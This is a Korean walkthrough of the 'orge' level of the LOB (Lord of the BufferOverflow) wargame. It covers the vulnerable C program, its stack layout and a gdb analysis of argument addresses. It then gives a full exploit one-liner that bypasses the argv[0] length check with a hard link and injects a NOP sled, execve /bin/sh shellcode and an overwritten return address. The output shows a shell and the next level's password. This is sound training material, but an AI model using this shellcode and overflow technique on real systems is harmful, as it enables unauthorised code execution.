============================================================================================================
[redhat-lob] (7) orge
============================================================================================================


.. graphviz::

    digraph foo {
        a -> b -> c -> d -> e;

        a [shape=box, label="argv[1] value"];
        b [shape=box, color=lightblue, label="strcpy"];
        c [shape=box, label="Buffer Overflow"];
        d [shape=box, label="RET"];
        e [shape=box, label="argv[1] address"];
    }


|

Source Code
============================================================================================================

.. code-block:: c

    #include <stdio.h>
    #include <stdlib.h>

    extern char **environ;

    main(int argc, char *argv[])
    {
        char buffer[40];
        int i;

        if(argc < 2){
            printf("argv error\n");
            exit(0);
        }

        // here is changed!
        if(strlen(argv[0]) != 77){
            printf("argv[0] error\n");
            exit(0);
        }

        // egghunter
        for(i=0; environ[i]; i++)
            memset(environ[i], 0, strlen(environ[i]));

        if(argv[1][47] != '\xbf')
        {
            printf("stack is still your friend.\n");
            exit(0);
        }

        // check the length of argument
        if(strlen(argv[1]) > 48){
            printf("argument is too long!\n");
            exit(0);
        }

        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);

        // buffer hunter
        memset(buffer, 0, 40);
    }

|

Vulnerabliity Vector
============================================================================================================

스택 메모리 공간에 다음과 같이 들어가게 된다.

.. code-block:: console

    ================
    LOW     
    ----------------
    Buffer  (40byte)
    SFP     (4byte)
    RET     (4byte)  <- strcpy overflow
    argc    (4byte)  <- 0x00000002
    argv[0] (4byte)  <- argv[0] 주소
    argv[1] (4byte)  <- argv[1] 주소
    ----------------
    HIGH    
    ================


|

Buffer Overflow
============================================================================================================

Overflow condition 

- environ을 초기화하여 환경 변수 사용를 통한 쉘코드 삽입이 불가능하다.
- argv[0]의 길이가 77이어야 함
- argv[1]의 47번째 문자열이 "\\xbf"이어야 함
- argv[1]의 길이가 47이하 이어야 함

.. code-block:: console

    ※ 시작시 bash2 명령을 입력하고 bash2 쉘 상태에서 진행
    $ bash2
    $ ./orge `python -c 'print "a"*47'`

    argv[0] error

    $ ./orge `python -c 'print "a"*47+"\xbf"'`

    argv[0] error

이번 문제는 argv[0]의 길이가 77 바이트를 만족해야 버퍼오버플로우를 진행할 수 있다.
77바이트의 길이를 가진 파일을 하나 생성하여 ln 명령으로 링크를 걸어준다. 
( 앞에 "./"가 있으므로 75바이트를 생성하면 된다. )

.. code-block:: console

    $ ln orge `python -c 'print "a"*75'`
    $ ls
    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa  orge  orge.c
    $ ./`python -c 'print "a"*75'` a
    stack is still your friend.


|


exploit
============================================================================================================

기존 문제들의 경우 실행 파일명(argv[0])의 길이에 대한 제한이 없었으나, 해당 문제는 실행 파일명의 길이가 77으로 제한되어 있어 해당 부분을 우회하여야 한다.

argv[1]이 저장되는 주소 확인
------------------------------------------------------------------------------------------------------------

앞의 조건에 argv[1][47]값이 "\\xbf"인지 확인하기 때문에, gdb를 이용하여 argv[1]이 저장되는 주소(buffer)를 찾는다.

.. code-block:: console

    (gdb) b *main
    Breakpoint 1 at 0x8048500

    (gdb) r `python -c 'print "a"*47+"\xbf"'`
    Starting program: /home/darkelf/./aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa `python -c 'print "a"*47+"\xbf"'`
    /bin/bash: /home/goblin/.bashrc: Permission denied

    Breakpoint 1, 0x8048500 in main ()

    (gdb) stepi
    0x8048501 in main ()

    (gdb) i reg $esp
    esp            0xbffffa48       -1073743288

    (gdb) i reg $ebp
    ebp            0xbffffa68       -1073743256

    (gdb) x/100x $esp

    ==========================================================================
    0xbffffa48:     0xbffffa68      0x400309cb      0x00000002      0xbffffa94
    0xbffffa58:     0xbffffaa0      0x40013868      0x00000002      0x08048450
    0xbffffa68:     0x00000000      0x08048471      0x08048500      0x00000002
    0xbffffa78:     0xbffffa94      0x08048390      0x0804866c      0x4000ae60
    0xbffffa88:     0xbffffa8c      0x40013e90      0x00000002      0xbffffb90
    0xbffffa98:     0xbffffbec      0x00000000      0xbffffc1d      0xbffffc3f
    0xbffffaa8:     0xbffffc49      0xbffffc57      0xbffffc76      0xbffffc86
    0xbffffab8:     0xbffffc9f      0xbffffcbb      0xbffffcda      0xbffffce5
    0xbffffac8:     0xbffffcf3      0xbffffd35      0xbffffd48      0xbffffd5d
    0xbffffad8:     0xbffffd6d      0xbffffd7a      0xbffffd98      0xbffffda3
    0xbffffae8:     0xbffffdb4      0xbffffdc6      0xbffffdd5      0xbffffddd
    0xbffffaf8:     0x00000000      0x00000003      0x08048034      0x00000004
    0xbffffb08:     0x00000020      0x00000005      0x00000006      0x00000006
    0xbffffb18:     0x00001000      0x00000007      0x40000000      0x00000008
    0xbffffb28:     0x00000000      0x00000009      0x08048450      0x0000000b
    0xbffffb38:     0x000001fa      0x0000000c      0x000001fa      0x0000000d
    0xbffffb48:     0x000001fa      0x0000000e      0x000001fa      0x00000010
    0xbffffb58:     0x0fabfbff      0x0000000f      0xbffffb8b      0x00000000
    0xbffffb68:     0x00000000      0x00000000      0x00000000      0x00000000
    0xbffffb78:     0x00000000      0x00000000      0x00000000      0x00000000
    0xbffffb88:     0x69000000      0x00363836      0x6d6f682f      0x61642f65
    0xbffffb98:     0x6c656b72      0x2f2e2f66      0x61616161      0x61616161
                                                      ^               ^
    0xbffffba8:     0x61616161      0x61616161      0x61616161      0x61616161
                      ^               ^               ^               ^
    0xbffffbb8:     0x61616161      0x61616161      0x61616161      0x61616161
                      ^               ^               ^               ^ argv[1] = 0xbffffbc7
                                                                            
    0xbffffbc8:     0x61616161      0x61616161      0x61616161      0x61616161
    ==========================================================================


|

RET 주소를 argv[1] 주소로 변경하여 공격 진행
------------------------------------------------------------------------------------------------------------

.. code-block:: console

    ================
    LOW     
    ----------------
    Buffer  (40byte) <- "\x90"*19 + shellcode(21)
    SFP     (4byte)  <- shellcode(4)
    RET     (4byte)  <- argv[1] address
    argc    (4byte)  <- 0x00000002
    argv[0] (4byte)  <- argv[0] 주소
    argv[1] (4byte)  <- argv[1] 주소
    ----------------
    HIGH    
    ================

|

오버플로우시 RET 주소를 argv[1] 주소로 변경하여 해당 쉘코드가 실행되도록 한다. buffer의 최초 주소값을 확인하여 4바이트씩 증가하면서 주소를 변경하면서 공격을 진행하면 성공시킬 수 있다.

nop (19 byte) + shellcode (25 byte) + argv[1] address

.. code-block:: console

    $ ./`python -c 'print "a"*75'` `python -c 'print "\x90"*19 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\xc7\xfb\xff\xbf"'`
    ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒1▒Ph//shh/bin▒▒PS▒▒°
                                           ̀▒▒▒▒
                                           
    bash$ whoami
    orge
    bash$ my-pass
    euid = 507
    timewalker


